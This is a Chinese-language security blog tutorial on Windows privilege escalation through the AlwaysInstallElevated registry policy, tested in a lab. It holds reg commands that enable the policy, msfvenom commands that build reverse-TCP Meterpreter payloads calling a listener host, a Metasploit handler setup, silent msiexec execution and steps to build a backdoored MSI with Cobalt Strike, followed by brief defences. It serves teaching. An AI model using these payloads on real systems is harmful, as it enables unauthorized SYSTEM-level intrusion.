---
title: "Windows提权-不安全的注册表项"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# Windows提权-不安全的注册表项

注册表是windows系统的数据库，系统、用户配置和系统组件等信息全部存储在注册表中

### 注册表启动项AutoRun



### AlwaysInstallElevated

注册表键AlwaysInstallElevated是一个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI(Microsoft Installer)文件

MSI文件是微软格式的应用程序安装包，实际上是一个数据库，包含安装和卸载时需要使用的大量指令和程序数据

#### 环境准备

以admin权限配置：

* win+r，gpedit.msc打开组策略管理器，找到`始终以提升的权限进行安装`：

  ~~~
  计算机配置-->管理模板-->Windows 组件-->Windows Installer
  ~~~

  ![image-20241008213435014](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213438347-767540864.png)

* 编辑“始终以提升的权限进行安装”为开启：

  ![image-20241008213714566](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213717931-636567087.png)

* 同样在用户配置中也要配置：

  ![image-20241008213942421](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213946436-248869562.png)

* 再在计算机配置中设置普通程序的安装可行性：

  ![image-20241008214328313](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008214332196-97622985.png)

* 如果未成功，还可以用命令修改下：

  ~~~cmd
  reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
  
  reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
  ~~~

  ![image-20241008221525356](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221527885-879356893.png)

* 再验证一下配置是否成功：

  ~~~cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ~~~

  ![image-20241008221552366](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221554934-1304735990.png)

#### 提权实验

##### msf

* 先用MSF获取apache用户的会话：

  ~~~shell
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=7890 -f exe -o payload.exe
  ~~~

  ![image-20241008220959447](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221002120-1462588056.png)

  当前shell权限为apache

* 使用注册表命令或使用winpeas查询到启用了AlwaysInstallElevated策略：

  ~~~cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ~~~

  ![image-20241008221627454](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221630695-9560581.png)

* 可以先试试提权模块：

  ~~~shell
  use exploit/windows/local/always_install_elevated
  ~~~

  ![image-20241008222039660](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008222043009-963878606.png)

  这里直接获取到了system权限

* 如果不行也可以尝试手动提权，先生成一个msi文件：

  ~~~shell
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=6789 -f msi -o payload.msi
  ~~~

  ![image-20241008222502948](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008222505991-937434037.png)

* 将msi通过shell传上去：

  ![image-20241008222631048](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008222633809-671306491.png)

* 建立一个监听：

  ~~~shell
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost 192.168.111.128
  set lport 6789
  exploit
  ~~~

  并运行msi：

  ~~~shell
  execute "msiexec.exe /quiet /qn /i payload.msi"
  ~~~

  ![image-20241008223636191](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008223640094-1621160776.png)

  成功获取system权限

##### CS

* 首先CS上线apache用户：

  ![image-20241008224105986](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008224108987-1310589396.png)

* 利用CS生成exe文件，然后使用visual studio制作MSI文件：

  ![image-20241008225443466](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008225446205-809699449.png)

* 选择creat a setup for a windows application，并添加远控exe：

  ![image-20241008225636359](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008225638825-1803018017.png)

* 选择自定义操作：

  ![image-20241008225952425](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008225955284-53759627.png)

* 右键install，添加自定义操作：

  ![image-20241008230040861](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008230043804-520566013.png)

* 选择Application folder中的后门文件：

  ![image-20241008230251400](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008230253785-1003138858.png)

* 右键添加的exe，更改属性中Run64Bit值为true（因为目标主机是64位）：

  ![image-20241008230436077](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008230438881-1800543098.png)

* 生成解决方案即可使用该msi文件：

  ![image-20241008230546349](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008230548889-1532015933.png)

* 上传并启动安装包：

  ~~~cmd
  msiexec /quiet /qn /i Setup1.msi
  ~~~

  ![image-20241008230759543](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008230802370-425905218.png)

  可以看见已经成功提升至system权限

### 针对不安全注册表项的防御措施

大致如下：

* 正确配置注册表项及其权限
* 定期检查开机启动项，防止存在权限维持
* 非必要情况下，关闭AlwaysInstallElevated策略
* 安装防护软件并保持更新，防止恶意软件破坏注册表